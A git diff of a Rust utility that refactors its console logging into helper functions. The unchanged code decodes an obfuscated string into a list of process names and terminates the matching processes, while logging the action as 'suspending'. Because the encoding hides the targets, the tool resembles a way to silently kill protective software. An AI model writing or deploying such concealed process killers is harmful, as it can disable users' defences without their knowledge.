@@ -1,9 +1,9 @@
-use psutil::{
-    self,
-    process::{self, Process, ProcessError}
-};
-mod decoder;
+use psutil::process::{ self, Process, ProcessError };
+
 mod printer;
+use printer::{ success, error, info };
+
+mod decoder;
 
 
 fn main() {
@@ -26,15 +26,16 @@ fn main() {
             },
         }
     }
-    println!("[ * ] Done! [ {} / {} ]", suspended, total);
+
+    success( "Done!", Some(format!("[ {suspended} / {total} ]").as_str()) );
 }
 
 fn handle_proc_error(err: ProcessError) {
     match err {
-        ProcessError::NoSuchProcess { pid     } => { println!("[ ✕ ] no corresponding Process ( pid {} )", pid) }, 
-        ProcessError::ZombieProcess { pid     } => { println!("[ ✕ ] is Zombie Process ( pid {} )", pid) }, 
-        ProcessError::AccessDenied  { pid     } => { println!("[ ✕ ] Access Denied ( pid {} )", pid) }, 
-        ProcessError::PsutilError   { pid, .. } => { println!("[ ✕ ] Package Error ( pid {} )", pid) }, 
+        ProcessError::NoSuchProcess { pid     } => { error("No corresponding process", Some(format!("( pid {pid} )").as_str())); },
+        ProcessError::ZombieProcess { pid     } => { error("Is zombie process",        Some(format!("( pid {pid} )").as_str())); },
+        ProcessError::AccessDenied  { pid     } => { error("Access denied",            Some(format!("( pid {pid} )").as_str())); },
+        ProcessError::PsutilError   { pid, .. } => { error("Internal error",           Some(format!("( pid {pid} )").as_str())); },
     };
 }
 
@@ -51,7 +52,7 @@ fn suspend_target_proc(proc: &Process, target_vec: &Vec<String>) -> bool {
         return false;
     }
 
-    println!("[ ✓ ] Process suspending... ( {} )", &proc_name);
+    info("Process suspending...", Some(format!("( {proc_name} )").as_str()));
 
     proc.terminate().is_ok()
 }
@@ -60,7 +61,8 @@ fn build_target() -> Vec<String> {
     let bytes = decoder::decode("EHQ&*E--2@:2OENF*)G@G@b5lB4Yt&:2OENF*)G@G@b6)G&g>qBP)-n@sWH<:2XZ^GA;AJAn1");
 
     if bytes.is_err() {
-        panic!("[ ✕ ] Decoder decode failed...");
+        error("Decoder decode failed", None);
+        panic!();
     }
 
     String::from_utf8(bytes.unwrap()).unwrap().split("N").map(str::to_string).collect()
